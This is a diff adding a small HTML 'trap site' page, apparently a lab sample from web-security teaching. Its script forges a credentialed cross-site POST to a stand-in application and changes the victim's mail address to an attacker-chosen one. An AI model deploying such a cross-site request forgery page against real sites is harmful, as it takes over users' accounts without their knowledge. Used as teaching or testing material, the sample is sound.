@@ -1,0 +1,10 @@
+<body>
+罠サイトです
+<script>
+  var req = new XMLHttpRequest();
+  req.open("POST", "http://example.jp/4g/4g-021c.php");
+  req.withCredentials = true;
+  req.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
+  req.send('{"mail": "cracked@example.com"}');
+</script>
+<body>
